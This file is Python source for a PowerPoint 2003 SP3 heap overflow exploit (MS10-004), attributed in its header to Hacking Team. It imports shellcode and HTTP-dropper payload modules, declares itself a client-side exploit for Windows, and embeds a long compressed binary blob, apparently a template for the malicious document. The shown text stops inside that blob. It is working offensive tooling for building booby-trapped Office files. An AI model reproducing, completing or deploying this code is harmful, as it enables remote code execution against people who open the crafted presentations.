#! /usr/bin/env python

#Copyright HT srl, 2010
#http://www.hackingteam.it/ for more information

#cod

# MS Office PowerPoint 2003 SP3 Heap Overflow Exploit (MS10-004)


import os
import sys
import math
import warnings

if "." not in sys.path: sys.path.append(".")
if "encoders" not in sys.path: sys.path.append("encoders")
if "payloads" not in sys.path: sys.path.append("payloads")

import time
import struct
import random
import zlib
import copy
import zipfile

import jscript_unicode
import x86shelldrophttp
import x86firststage
import x86heap
import x86int3
import ASCIIHexWhitespace
import x86helloworld

NAME='Microsoft PowerPoint 2003 SP3'
DESCRIPTION='[+] MS Office PowerPoint 2003 SP3 Heap Overflow Exploit (MS10-004)'

DOCUMENTATION={}
DOCUMENTATION['Vendor']='Microsoft'
DOCUMENTATION['Date public']='N/A'
DOCUMENTATION['References']='http://www.microsoft.com/'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['VersionsAffected']='Microsoft PowerPoint 2003/SP3'
DOCUMENTATION['CVE']='CVE-????-????'
DOCUMENTATION["CVE Url"]="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-????-????"

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['2000','XP', 'VISTA', 'SEVEN']
PROPERTY['VENDOR']='Microsoft'
PROPERTY['DELIVERY']='HTTP'

NOTES="""
Tested on:
Windows XP Professional SP3 English with Microsoft Office XP/2007
"""

CHANGELOG="""
"""

# Global payload
payload = 0

class ms10_004():
	def __init__(self, inputFile, zipFile, outputFile, dbg):
		#self.setInfo(DESCRIPTION)
		self.name=NAME
		self.debugmode = dbg
		self.outputCompressed = zipFile

		self.compressedfile = (
b"\x78\xDA\xED\x5D\x0B\x7C\x54\xC5\xB9\xFF\xCE\x9E\xDD\x64\x93\x6C"
b"\xD8\x85\x04\x1A\x11\x71\xA1\x2A\xF8\x06\xD7\x6B\xE5\xD6\xF2\x10"
b"\x44\x51\x11\xE4\x61\xAD\x97\x4A\x10\x72\x20\x6D\x4C\x30\x89\xC5"
b"\xB6\xF6\x12\xA5\x52\xA1\x5A\x51\xA8\x75\x5B\xAF\xA2\xA2\xF5\x41"
b"\x94\x2A\xB9\x7D\x24\x95\xA8\xD5\x5A\x59\x2D\x5A\xA0\xF6\x5E\x52"
b"\x69\xE8\x2D\xAD\xE5\x5E\x97\x16\x2B\xBE\x98\xFB\x7D\xDF\xCC\x6E"
b"\x4E\xF6\x01\x79\x11\x62\xF9\xFE\xF9\xFD\xCF\xFB\xCC\x7C\xF3\xCD"
b"\xCC\x7F\xE6\x9C\x33\x99\xDD\xF2\xEB\xFE\x3B\x1F\xF8\xD1\xE0\x3F"
b"\x40\x0A\xC6\x82\x0D\x07\x54\x1E\xE4\xB8\x8E\x79\x90\xEB\x13\x3B"
b"\x21\xC0\xF3\x4A\xD1\x66\x62\xFD\x38\xF2\x09\xA4\x12\x7C\x62\xB0"
b"\x76\xF2\x71\xF1\xC0\x1C\x80\xE3\x9A\xBE\xF0\xAB\x37\x8A\x9E\x7C"
b"\x62\xC3\xBD\x37\x4F\xD9\x9D\x9B\xEF\x51\xEA\x4D\xB5\x13\x42\x17"
b"\x4F\x9E\x32\x19\x2C\xCB\x82\x52\xFC\x03\xF5\x07\x18\x74\xC1\x0D"
b"\xE5\x0E\xC0\x94\x29\xA7\x80\x3F\x59\x30\xD4\x7F\xC3\x44\xF0\xE7"
b"\xE4\xE4\xE6\xF8\xC4\xA3\x02\x81\x40\x20\x10\x08\x04\x02\x81\x40"
b"\x20\x10\x08\x04\x02\x81\x40\x20\x10\x08\x04\x02\x81\x40\x20\x10"
b"\x08\x04\x02\x81\x40\x20\x10\x08\x04\x02\x81\x40\x20\x10\x08\x04"
b"\x02\x81\x40\x20\x10\x08\x04\x02\x81\x40\x20\x10\x08\x04\x02\x81"
b"\x40\x20\x10\x08\x04\x02\x81\x40\x20\x10\x08\x04\x02\x81\x40\x20"
b"\x10\x08\x04\x82\xA3\x19\x75\xF9\x23\x1F\x6C\xC7\x71\xEA\x77\x20"
b"\x38\x6A\x10\x84\x3F\xDB\x9B\xBD\x00\x16\xFC\xC5\x1E\x89\xFB\x75"
b"\x83\x00\x76\x86\x34\x69\xDB\x87\xC7\xF2\x91\x36\x12\x2F\xC3\xEB"
b"\x18\x56\x10\xFE\x66\x17\xE3\xCE\x99\xF0\x72\x30\x80\x07\x46\xC1"
b"\x1B\xC1\xC4\xF9\x20\x6C\xCB\xBD\x94\x2F\xFB\x71\x70\x12\x2E\x27"
b"\x40\x35\x94\xC3\x3C\xA8\xC0\xED\xAD\xCB\x8A\xE0\xF5\x97\x02\xA3"
b"\x68\x0D\xE6\xBE\x8A\xBB\x8B\x80\x38\xB2\x6C\x05\xEC\xC3\xE3\xD3"
b"\x5E\x0C\x8C\xDA\x67\xCE\x53\x58\x3A\xE6\x75\x41\x9A\x70\xBE\x0E"
b"\xC6\xF3\x2F\x0C\x00\x3C\xCC\xF1\x22\xFC\x67\xE0\x22\x97\x37\x1F"
b"\x0B\xE6\x9B\x6D\x0F\x04\xF0\xA6\xF1\xF0\x50\xB0\x12\x28\x15\xEA"
b"\xE3\x71\xB8\x1E\x1E\x06\x58\xC0\x33\xD6\x9B\x35\x63\x3C\xFD\xB0"
b"\x01\xDF\xA5\xD4\x3B\x7A\x42\x7B\xC6\x00\x30\x09\x42\x27\x84\xAD"
b"\xB0\x4E\xBA\x8F\xAE\xD7\x77\xD0\x76\xA9\x5D\x6A\x27\xB6\xEB\xBC"
b"\x75\x5E\x6D\x73\x81\x77\x1F\xAF\x21\xBE\x87\x4F\xE6\xC4\x4B\xC9"
b"\x7F\xE8\xE0\x02\x5C\x9F\x4A\x47\x4C\xD0\xB9\xC6\x06\xAF\x6B\x4D"
b"\x81\x17\x99\xFD\x7C\x73\xCC\xAF\xA3\x60\xD2\xBD\x79\xE6\xDE\x62"
b"\xD7\x7D\xC7\x83\x15\x3F\x0D\xD7\x33\x20\x37\x7E\x02\x5D\xEB\x4B"
b"\x9B\xD5\x1F\x8A\xE7\x24\xF3\x90\xB1\x0C\x0A\xE2\xA3\x70\x7D\x93"
b"\x85\x21\xF8\x97\xD1\x29\xFF\xF2\x09\x74\x66\x93\x15\x82\x10\x34"
b"\x5B\x78\xC8\xFF\x22\x1F\x51\x96\x1F\xED\xB0\x3C\x68\x9F\x7F\x3C"
b"\x0C\xDD\x1B\xD2\xF1\xFA\xE9\x0A\x3A\xF6\x1E\x40\xE8\x78\x88\x07"
b"\x87\x70\xC8\x7F\xB7\x8B\x4D\x5A\x5C\xA8\xD3\xFE\xD9\x92\xFB\xA0"
b"\x45\xF6\x16\x7B\xF5\xB5\x03\xBD\x74\xED\xCF\x56\x6F\xF8\x07\xBC"
b"\xF2\xFD\xCF\xD6\xE7\xAE\xF9\x25\xAD\x29\xEA\x20\x7C\x60\x2F\xE4"
b"\x6B\x0E\xD8\x76\x22\x3F\x3E\xB6\xCF\xC6\xE5\x55\xA0\x33\x31\xB1"
b"\x26\xEC\xB8\x6E\x05\x04\xBE\xA9\x8B\x50\x22\xCE\x5B\x31\x2B\x3F"
b"\xFA\x58\x29\x0B\x9D\xBA\x18\x3E\xB4\x13\xBF\x5B\xB0\x18\x37\x12"
b"\xFB\x14\xEA\xF8\x02\x32\x49\x25\xCC\xF6\x06\x52\x7E\xFA\xE2\x78"
b"\x28\xF2\x9E\xC7\x7B\x3A\xFE\x05\x29\xA4\x6B\xCE\xC5\xB8\xEF\xB9"
b"\x35\x30\x8A\x8A\x73\x1A\xAC\x22\x0C\x23\x6B\x72\x66\x9B\x60\x12"
b"\x6B\x3A\x73\x6F\x41\x7E\x5E\x6A\x72\x1E\xFC\x40\xA9\xB5\x2A\x3D"
b"\x39\x64\xBE\x3B\x39\x94\xBC\x20\xDC\x5A\x74\x2E\x7B\x7C\x65\x91"
b"\x0E\xE0\x67\x41\xCA\xB5\xB9\xFC\x37\x1D\xFF\x66\xC1\x68\xA0\x33"
b"\xDF\x2E\x0A\xF1\xF9\x42\x2F\x87\xD7\xAC\x39\x0D\x7E\x67\x6A\xD9"
b"\x7F\x71\xED\x2E\x84\xCF\x61\x58\xF1\xE0\xB5\xAE\x1C\xF6\xB9\x95"
b"\x21\x59\xB4\xEE\x0F\x7A\x93\xE9\x7E\x34\x38\x8C\x54\xE0\x50\x00"
b"\x78\x20\x48\x01\x0E\x4F\xDE\x38\xDC\xF8\x7E\x24\xCA\x4C\xFB\x62"
b"\x95\xE3\xAA\x32\x6D\x91\xBE\x6D\xEB\xE2\xB5\xDF\x5E\x97\x47\xF7"
b"\xBD\x63\x97\x98\xD3\x96\x27\x37\xCF\xDF\x2E\x33\x02\xA3\x4A\x21"
b"\x9E\x1B\xD6\x95\x5D\x97\xCD\x3A\x2E\x9D\xD0\xB8\x73\x17\x44\x22"
b"\x51\x80\x68\x14\xA2\x31\xAC\xE2\x29\xD7\xDD\x7D\xF7\xDD\xBC\xFE"
b"\xF0\xAD\x99\xA0\xA2\x0E\xC4\x22\x78\xA9\x93\x7E\x5D\x22\xBC\x68"
b"\x4C\x41\x0C\x19\x89\xC4\xE0\xA9\x85\x2A\x79\xDD\xEF\xFF\xB1\xB7"
b"\x5D\x78\x74\xDF\xED\x2F\xE1\xBD\x0E\x46\xFA\xA8\x3B\x3C\xDD\x22"
b"\x2F\x59\xB2\xC4\x5C\xF7\x1E\x44\x62\x31\x50\xD3\xA7\x63\xFC\x6D"
b"\xD7\x61\x84\x3A\xEE\xAB\xAE\xC4\x35\x9E\x58\x70\x0D\x5C\x5B\xF5"
b"\x4B\xAD\x96\xAA\xED\xBA\x3A\x13\xD7\x9C\xE3\x01\xDE\x7A\x63\x35"
b"\xDB\xFF\xEC\x57\x4B\xF9\x9E\xDF\x3C\x78\x4C\x5B\x78\x10\xD5\xE1"
b"\x45\x30\x8D\xB8\x8E\x90\x5D\x1B\xC8\x3C\x05\x6A\xB7\xE5\xBA\x4E"
b"\x87\x17\x71\xA2\xB0\xEB\xAF\x98\x26\xF4\xDD\xE4\x95\x97\xF0\x75"
b"\xF1\xFF\x69\x8B\x77\xD1\x97\xBF\xC8\xD7\x51\x3A\x5E\x7F\x7D\x33"
b"\xAC\x5A\x75\x33\xD4\xDD\xF7\x28\xA8\x98\x03\x7F\xD9\xF1\xD3\xE4"
b"\x75\x8E\xA3\xE3\x1D\x3B\x76\x0E\xAF\x4B\xBF\xF0\x75\x3C\xA6\xD8"
b"\x8F\x64\x63\xE2\xBA\x19\x63\x4F\xE2\xF3\xA7\x87\x07\xC2\x5B\xCD"
b"\xB7\xC3\x6D\x5F\x5F\x0C\x77\xCC\x3D\x13\x62\x1B\x01\x6E\xBB\x6F"
b"\x2D\x5E\xF1\x50\x70\x2C\xE7\x7F\xAA\xF8\x5B\x1D\x10\x7F\x12\x52"
b"\x6A\xF5\x42\x18\xCA\x8D\xC9\x26\xC4\x4A\x69\x42\xA8\x2C\xBE\x79"
b"\x90\x50\xC2\xA6\x7C\xD6\x61\x2D\x29\x0A\x6F\xE5\x46\xC4\x03\x43"
b"\x78\x7F\x78\x78\x0B\x37\x24\x1E\x28\x31\xE7\xE3\xDC\x98\x78\x30"
b"\x54\xDA\x6F\x84\x90\x4F\x37\x28\xE1\x83\x36\x63\x43\x0F\x91\x92"
b"\x40\x17\x9B\xB1\xE9\x18\xEB\x0C\x53\xC1\xAD\x3C\x77\x45\xB3\x92"
b"\xFB\x3A\x34\x4F\x72\x5F\x87\x68\x27\xF7\x75\xA8\xDE\xE4\xBE\x0E"
b"\xB9\x14\x43\x0E\x40\xFB\x86\x68\xB1\xC9\x2D\x9F\x4B\x73\x87\x24"
b"\xAF\x20\x1F\x79\x92\xDB\xC5\x60\x27\xB7\x07\x24\x75\x80\xB6\xEB"
b"\x32\x84\x52\xE2\x0A\xA5\xD8\x15\xCA\x00\x57\x28\x21\x57\x28\x21"
b"\x54\x90\x80\x77\xBB\x97\x94\xC4\x13\x7F\xCD\x4B\x65\xC0\x1F\xF7"
b"\x1B\xD5\xC9\xE1\xE3\x76\xDC\xE1\xB5\x37\x3E\x92\xD3\x91\x17\x0F"
b"\x65\xE8\x5C\x79\x20\x9F\xEF\xA3\xC0\x7D\xA0\xAF\x7F\x03\xD7\x03"
b"\xCC\x71\x8F\x57\xB7\xF0\xAB\xB1\x11\x3E\x07\x37\x97\x62\x48\x3E"
b"\x4C\xC3\xC8\x75\x2B\xE0\x5B\x6C\xB5\xBB\x59\xDE\x84\xED\x61\x7F"
b"\xD3\x20\x2B\x5C\xE6\x99\xA6\x18\xED\xE3\xD0\xEA\x31\x37\x4A\x07"
b"\x7E\xC3\x0E\x42\x7F\x63\xCD\x0B\x05\xFE\x64\x8E\xAD\xC0\xD8\x0B"
b"\xE3\xB3\x32\x88\x33\x95\xD1\x89\x15\xE5\xF3\xBF\x1C\xAE\xAD\x0A"
b"\x97\x2D\x28\xAF\x0D\x4F\x9D\x57\x53\x5B\x56\x1D\xAE\x2D\xAF\xAD"
b"\x28\x0B\xD7\xD4\x7E\xB5\xA2\x0C\x9B\x9D\x20\xA5\x7E\x98\xB9\xEB"
b"\x71\xEE\x68\x0D\x4B\xE6\x21\xA5\x6C\x90\xD5\x96\x32\xDB\xA4\x2C"
b"\xD1\xBD\x48\xA4\xAC\xF8\x87\x2B\x3A\x95\xA6\xB8\x4D\x69\x2A\x0A"
b"\xA6\xA6\xC9\x62\xEF\xEA\x34\xDD\xE7\x4A\x93\x65\xD2\x34\xC3\x34"
b"\x38\xE7\x23\x26\x22\x26\x21\x2E\x40\x4C\x46\x5C\x88\xB8\x08\x31"
b"\x05\x71\x31\xE2\x12\xC4\xA5\x88\xA9\x88\xCB\x10\xD3\x10\xD3\x11"
b"\x97\x23\x66\x20\x66\x22\x66\x21\xCA\x2A\xC8\x0B\x43\x93\x5E\x28"
b"\xE4\xF8\x02\x6C\x49\x21\x97\xFA\x80\x69\x95\xB4\x77\x66\xB6\xF3"
b"\xCE\x7F\xBA\xF2\xDD\x9B\xC5\x3B\x3B\xEB\x3B\xE7\x9D\xAB\x83\xE8"
b"\x9D\x9C\x95\xA1\x54\xEF\x50\x19\xCF\xB5\xB4\x77\xC6\xBA\xBC\xA3"
b"\x73\x7D\x6D\x90\xCE\x9F\x02\x89\xF6\xD6\xD3\xAE\x97\x43\xCB\x7E"
b"\xB8\xDC\x9F\x2C\x23\x64\xFD\x4F\x5C\xD6\xFB\xB2\x58\xBF\xEA\x47"
b"\x9D\xB5\x7E\x43\xEE\x96\x7E\xE9\xD6\x53\xAD\xCC\xF3\x68\xEB\xC7"
b"\x1F\xD4\xFA\x41\x6D\xD6\xFB\xC9\xD7\x6E\xFB\x3F\xC8\x6A\x7F\x4E"
b"\x16\xFB\x87\xFC\xB8\xD3\xDE\x0F\x95\x0E\x4C\xB7\x9F\xBB\xEB\x5D"
b"\xB0\xDF\xD3\xCE\xFE\x37\xDB\xD9\x7F\x91\xCB\x7E\x32\x91\x8A\x5A"
b"\x5B\xD7\x1D\xD8\x66\x54\x18\xFF\x6A\xEB\x3B\xF7\x7F\x1B\xD6\x58"
b"\xBF\xFF\xF9\x22\xEC\xC0\x0F\xC0\x7B\x14\x99\x0F\x5E\x9B\x04\x78"
b"\x9C\x8D\xCA\x8D\x6A\xD6\xB1\x7E\x4F\xE7\x3B\x8F\x7F\x3D\x83\xEC"
b"\x7B\xEF\xEF\xCF\x5B\x8B\xCF\x39\x7D\x5A\x18\xAF\xA7\x3E\xDB\x24"
b"\x28\x03\x07\x1F\xFF\xAE\xC7\x07\xC0\x5A\x6C\xCB\x68\xBF\x06\x1F"
b"\x08\x17\x42\x25\x75\x26\xED\xA7\x7D\x94\x77\x7B\x13\x1D\x59\x34"
b"\xA6\x70\x14\x29\xF0\x59\x3E\xAD\xC0\xA7\x50\x5B\x65\x14\x98\x5A"
b"\xB7\xDC\x12\xAD\xC0\xCF\x77\x46\x81\x4B\xDA\x14\xD8\x5D\x13\x3D"
b"\x25\x99\xCB\xC2\x3D\x7F\xCA\xCF\xEB\x4C\x59\xE0\xF6\x32\x37\x6C"
b"\x65\xD2\xDE\x7C\x4F\x7E\x5E\x57\x6B\x22\x29\xCA\xFB\x59\x4B\xB2"
b"\x9D\xC5\xFA\x3D\x2F\x76\xD6\xFA\x3B\xF2\xDE\x0A\xA5\x5B\xAF\x1F"
b"\x50\xB5\xF5\x5D\x2B\xC9\x81\x34\x25\x59\xE0\xD6\x41\x63\xFF\x7C"
b"\xB4\xFF\x04\xB6\xDF\x6B\x79\x2D\xDD\xF2\x2D\xB5\x28\xFE\x4D\x56"
b"\x7F\xB4\x9C\x1E\x3C\xF3\x60\x9C\xC7\xE2\x33\xDA\xE6\x0D\xD6\x16"
b"\x4F\xA8\x5F\x38\x3F\x93\xF6\xF9\xD8\xE6\xF6\x2D\x92\x2F\x8B\xAF"
b"\x7E\xF1\x6E\xE7\x7C\xB5\x21\x7F\x83\x35\x2A\xB8\xA5\x38\x93\x6A"
b"\xE5\x98\x9C\x76\xB7\x48\x1E\x57\x8B\x94\xB9\x95\x2D\xBB\xA1\x56"
b"\x37\xB2\x35\x85\x33\xCB\xE6\x57\x55\x2E\x08\x57\x94\x7D\xA5\xAC"
b"\xA2\x70\xD6\xA2\xF2\xEA\xC4\xF6\xE4\xAA\xEB\xAB\x6B\x17\x25\x76"
b"\xCA\x9D\xC4\x76\x77\x5A\xA4\x26\xB7\x26\x96\x64\xEE\x89\xDC\x7A"
b"\x20\x3F\xEF\x5B\x9C\x86\xCE\xF8\x68\xEE\x40\xAA\x0D\x4B\x07\x65"
b"\x52\xC6\xBC\x6E\xD6\x86\xF6\xBA\xFE\xAC\x2B\x0D\xB9\x59\xD2\x70"
b"\x9B\xFF\xE5\x2E\xA5\x81\xEA\x44\x7A\x1A\x7C\xAC\xEE\x2F\x77\xB3"
b"\x4E\x1C\x44\xDD\x4B\x0E\xA6\xEE\xA4\xEB\x6B\x58\xE3\x8F\x94\xBA"
b"\x5F\xF7\xF8\x2B\x16\xBC\x0B\x8B\x82\xF0\xAB\xE0\xC6\x1C\xE0\xBE"
b"\xF2\xA4\x1C\xAD\xD4\xE7\xE5\x50\xDF\x5E\x2B\x35\x33\xAC\x95\x7A"
b"\xBD\xAF\x13\x4A\x1D\x6E\x53\xEA\x7D\x6E\xA5\x0E\x67\xAE\xBF\x5B"
b"\x8F\x79\xB9\x07\x95\x5A\xE7\xEB\x8D\x19\xF2\xF5\x2C\x5C\xD6\xE0"
b"\xD3\x56\xE7\xFE\x12\x65\x79\x70\x32\x9D\x83\x5D\xA5\xE0\xF1\x20"
b"\xBD\x62\x3C\xC6\xD4\x4A\x3B\xF9\x9C\x42\x69\x7F\xC5\xAD\xF3\x59"
b"\xD2\xEE\xFF\x6C\x0F\xEA\xBC\x49\xFB\x8C\x0C\x69\xA7\x9E\xFF\x42"
b"\xFE\x4B\x94\x6B\xAF\xAB\x5C\x7B\xD3\x52\x64\x67\x4C\x51\xAB\x5B"
b"\xF9\xC3\x99\xEB\xEA\x3D\x07\xE8\xC9\xA7\xA7\xF4\xC6\xC3\x7A\xA3"
b"\xD3\xB5\x20\x43\xBA\x06\x27\xD3\x95\xE9\x2F\x91\x77\xFD\x92\x79"
b"\xD7\x2F\x2D\xA5\x85\x19\x53\xEA\x56\x25\x5F\x96\x94\x5E\xFA\x71"
b"\xD7\x52\x9A\x59\x95\xEC\xC3\xA0\x4A\x57\xE2\xFA\x1A\xAF\x69\x1F"
b"\x52\x4A\xE0\x2D\x7C\x5F\xA6\x67\xD4\xB6\x97\xC6\xEE\xD7\xC5\xC9"
b"\xD6\xD3\x5B\x9A\xB7\xB8\x80\x5A\x6D\x6F\xFC\x4B\x14\xBE\xC7\x68"
b"\x77\x58\xBF\xC0\x7C\x06\xC3\x3F\xDF\xD8\x7D\x15\x5C\x68\x8D\x42"
b"\xA3\x2F\xB2\x36\x3C\x97\x03\x53\xAC\x95\xB7\x29\xB5\xC9\x82\x64"
b"\xF8\x5B\x68\x09\xAF\xF3\xD2\x1D\x97\x6D\xEB\x34\x99\x18\x73\x77"
b"\x7A\xC7\xFB\xC6\x17\x50\x8C\x27\x58\x6D\x3A\xE3\x37\x29\xDA\x85"
b"\x31\x7E\x84\x9B\xE7\x5B\x13\x30\xD2\x89\x56\x2B\xDE\x3C\x89\xBB"
b"\xD8\x17\x3C\x47\x1F\x2C\x26\x3F\xC7\xB9\x66\x91\xB6\x76\xEC\x25"
b"\x79\x09\xBD\x71\x60\x4B\x8E\x85\x63\x21\x8E\x32\xFC\x2C\x8C\x80"
b"\x3D\x30\x01\x4E\xB4\xBE\x04\x97\x5B\x27\x5A\x25\x9E\x41\x9E\x87"
b"\x3D\xC3\xEC\xAD\x9E\xCF\xD8\x6F\x7A\x2E\xB6\x5B\x3D\xA5\xC8\xAF"
b"\xD9\xDF\xF0\x2C\xB1\x8F\xF1\x6C\xB4\xB7\x58\x2F\xD8\x6B\xAC\x56"
b"\x7B\x91\xF5\xA1\x7D\x86\x95\xE7\xED\x67\xF5\xF7\xEE\x81\xA1\xDE"
b"\x18\x7C\xDA\xBB\x09\x4E\xF3\x36\x40\xC4\xFB\x18\x9C\xEB\x5D\x0B"
b"\x13\xBC\xB7\x31\xCF\xE1\x57\x19\xCF\x62\xCC\x43\x28\x67\xC6\xC3"
b"\x53\x56\xF8\xA0\x5C\x8F\x16\x13\x9F\xB2\x4A\xA9\xC7\xAD\x7D\x55"
b"\xE7\x5D\x69\x6F\xCE\xBD\x26\x37\xAD\x4D\x0A\x77\xAF\x4D\x3A\x1E"
b"\x7C\xF1\x30\xD7\x94\x01\xF1\x92\x94\x8F\x02\x94\xF3\x89\x8F\x91"
b"\xBD\xD1\x76\x2D\x7E\x7E\x5F\x75\x10\xFE\xCF\xBE\x2E\xD0\xF6\x86"
b"\x98\xFA\x46\x85\x45\x45\x45\xC9\x8F\x14\x16\xF5\x7B\x03\xFC\x14"
b"\x52\x9C\xA7\xDB\xB6\x40\x1E\x35\x4D\xBA\x6D\x23\x1D\x18\x10\xD2"
b"\x6D\xDB\x79\xFE\x4E\xB4\x6D\xA1\xB6\xB6\xAD\xDA\xAD\x86\x78\x3C"
b"\xEC\xA1\xFE\x59\x41\x7C\x28\x6B\x04\xD5\x80\x3A\xF8\xE8\xE2\xFC"
b"\xBC\x4D\xDC\x0F\x56\xBC\xB4\x6C\x7E\x63\xD4\x81\xF7\x3D\x85\xA6"
b"\xD7\xAE\x5F\xDE\xDF\xD7\xAE\x5E\xBB\x63\xF6\x65\x89\xF9\xCD\xEF"
b"\x52\xCC\x16\xC7\x6C\x71\xCC\xB6\x2B\x66\x7A\x2B\x13\x2A\xC8\xFC"
b"\x56\xA6\xC8\x72\xC7\xAC\x55\x28\x17\xB4\xAF\xF2\x73\xDA\x5A\x82"
b"\x84\xAF\x16\x17\xE8\xEA\xBE\x01\x85\x69\x4B\x4E\x9B\xAF\xF2\x42"
b"\xF4\xD6\x9E\x3E\x84\x15\xC4\x73\xD8\xB2\x3A\xFC\x5B\x06\xC3\xF7"
b"\x72\xEB\xEC\xE3\xB7\xFA\xFC\x9A\xCF\xFB\xE2\x39\xFC\xB1\x6B\x38"
b"\x06\x9B\xE3\xFB\x7D\x8B\x05\xB9\x3E\xCA\x51\xFF\x8B\xA4\x75\xE3"
b"\x7C\x5C\x1A\xF1\x2F\x00\x6F\xB4\xBC\x71\x3F\x91\xEE\x5A\xBD\xE7"
b"\x57\xCB\x69\x7B\xF4\x71\x67\x5F\x37\x27\x7E\xB9\x45\xDB\x8B\x4F"
b"\x3B\x73\xD1\x71\xCF\x5D\x5C\x42\xDB\xCF\x2C\xF5\x4C\xF4\xF2\x7D"
b"\xE9\x30\xAD\xA9\x77\x71\x41\xE9\xC0\xF1\x79\x99\x5A\x9D\x22\x8F"
b"\x7E\x02\xA1\xF7\x6D\x4F\x1B\x0D\xF5\xE3\x45\x9E\xF6\x4F\x3B\xF8"
b"\x77\x25\x37\x1C\x4B\xAD\x31\x30\x06\xB4\xFA\xEB\xFA\x33\x8E\xDF"
b"\x3D\xA3\xBF\x32\x7A\x89\xC2\xAE\xA5\x37\xC1\x46\x3F\x43\x78\xD1"
b"\xF9\x05\xBA\x95\x99\x64\xF4\xB3\x9F\x75\xA1\xF5\xC4\x20\xD2\xCF"
b"\x4B\xEB\x01\xF5\x73\xF4\xCF\xDF\x57\x5A\xA9\x36\x5B\xF7\x57\x25"
b"\x34\xD3\xB6\xC9\x80\xBA\x17\xFA\x71\xFD\xA9\x81\xB3\xB1\xE6\x8C"
b"\x86\xB3\x74\x69\xE1\xB8\x43\xFD\xB1\x8C\xD0\x33\x3A\xB6\xB2\x1B"
b"\x7C\x6D\x71\x7B\x4C\xDC\x54\xF5\x3C\x19\xE2\x6E\xD8\xF6\x81\xBA"
b"\xC8\xA2\x7A\x3D\x85\xB7\x3B\x1A\xF7\xE8\x0C\x71\xF7\xEF\xDF\x3E"
b"\xEE\x44\xBA\xFB\x65\x89\x5B\xA7\x7B\xD9\x0C\x8A\xFB\xCF\xFF\xFB"
b"\x61\x87\xE3\x1E\xE5\x8A\x3B\x5C\xA8\xE3\x0E\xB9\xE2\x8E\xF1\x57"
b"\x29\x1D\x77\xBE\xC9\xCF\x17\x30\xEE\x2B\x58\x36\x9A\x6F\xC1\xFE"
b"\x18\x87\x70\xB3\xF9\xB8\x4A\xF8\x26\x2F\xD3\x5B\xCC\xF4\xB6\xB2"
b"\xBD\x35\xA3\x80\xCA\xF5\xA7\xB1\xC4\x53\x5D\xCA\x63\x85\xCF\xB7"
b"\x2D\x97\x85\xA5\x41\x9D\xE4\xE6\x01\xDA\x52\xAA\x77\xA7\xA4\xB5"
b"\xFE\xBA\xCD\xB7\x5C\xEF\xC9\xAC\x84\x2A\xA5\xA5\xA9\x20\x2D\x4D"
b"\x23\xEF\xE8\xD9\x34\x7D\x26\x43\x9A\xC0\x95\x26\x2A\xE9\xE4\xED"
b"\x2D\xFD\x12\x25\xBD\xBB\x69\x0A\xA4\xA5\xA9\xEE\x91\x9E\x4D\xD3"
b"\xB9\x87\x48\x13\xE5\x13\xA5\x89\xF2\xA9\x67\xD2\x54\x98\x96\xA6"
b"\x39\xF5\x3D\x9B\xA6\x31\x87\x48\xD3\xF4\x22\x9D\xA6\x36\x45\xEA"
b"\x4A\x9A\xEE\x73\xE9\x63\x7F\x6A\x8B\x4C\x9A\xAE\x4E\x86\xB0\x14"
b"\xD3\x70\x0B\x78\x27\xF0\x07\xAC\xE7\x28\xB4\x1C\x4B\xA7\x83\x7A"
b"\x09\xCB\x78\xA9\xDB\xC8\x66\xCB\x7C\xDC\xA3\x58\x3C\xD4\x77\xD0"
b"\xAD\xD6\x4C\x98\x07\x95\x98\xAE\x30\xD4\x42\x39\xB2\x1A\xCA\x5C"
b"\x2A\xFE\xA3\xBC\x33\x0B\x1F\x28\x4A\x6F\xCB\x6C\x97\x8A\xBB\x7B"
b"\xC2\xD4\xEE\xF7\x44\x4F\x18\x23\xC8\x1B\x5F\xD0\x9C\x93\xD6\xD7"
b"\x0A\x75\xEF\xED\xEE\x38\xEC\x6B\x95\xBA\xFA\x5A\x96\xA9\xD5\xA4"
b"\x56\xFD\x42\x6D\xEF\x53\xDC\x7D\xB1\x80\x39\x1F\xCC\x70\xDE\x36"
b"\xA5\x8D\xCE\x87\x5C\xE7\x0F\x5F\x5F\x6D\xF7\x19\x89\xBE\x84\x1E"
b"\x4C\x74\x6B\xD1\x68\x73\xFF\xC9\x59\xEF\x3F\x8B\xEF\xE7\x8F\x8C"
b"\x70\xA2\xD7\xDC\xFB\x27\x0E\x28\xF1\x19\xC8\xBD\x4F\x9F\x82\x8E"
b"\xA2\x41\x7E\xFB\xDB\xBD\x47\xD3\x6E\x48\xDD\x27\x17\x1D\xEC\xFC"
b"\xA1\xF6\xE9\x2B\x1B\xB8\xF6\xE9\x4B\x9B\x7B\x9F\x5C\xEE\xBE\x9E"
b"\xBE\xC8\x79\xA0\xAD\xEF\xDF\x71\xB8\x2B\xCB\x90\xBE\xFF\xB2\x2C"
b"\xFE\x94\x6F\x11\x40\xF5\xA7\x86\xE8\x0F\xE2\x7C\xF6\x37\xA8\x13"
b"\x4B\x51\x6F\xC7\x14\x03\xBC\x3B\x18\x65\x92\xFA\x83\xF0\xAE\x19"
b"\xE2\x02\x50\x13\xD6\xDF\xA6\x9D\x11\xBA\x12\xE8\xE1\x2E\x2F\x8E"
b"\xEE\xF9\xF1\x7F\x07\x14\xF5\xA5\x3D\xE9\x63\x95\x90\x3B\x6F\xB9"
b"\xFF\x6F\xEF\x4F\x5B\x14\x7A\xE2\x4E\x3F\x9C\x3A\xE2\x99\xDF\x51"
b"\xFA\xD6\xD4\xB7\xBD\xF4\x58\x6C\x8A\xC0\x0D\x46\xAC\xEF\x31\x5D"
b"\xFD\x75\xE6\xF5\xDF\x06\x33\x4E\xAD\x99\x73\x0C\x20\x66\x1E\xB5"
b"\x68\x4C\x1C\xF5\x67\xF7\xEB\xCC\x03\xAA\xAF\x14\x66\x88\xC7\x7B"
b"\x01\x0C\xC1\x35\xF6\xB9\x40\x3F\xAE\x03\xFC\x11\x03\x1F\xAA\xBF"
b"\xE1\xC0\xF4\xAA\x25\x65\xD5\xD3\xAB\xCA\x2B\x6B\xC3\xD3\xAB\xCB"
b"\x6A\xCA\x2A\x6B\xE7\xD5\x96\x57\x55\xF2\xF9\x44\x57\x3D\x75\x9B"
b"\x6C\xB9\xAC\x7C\x7E\x55\xC5\xBC\x9A\xE4\xB9\xD1\xD0\x16\xE6\xD4"
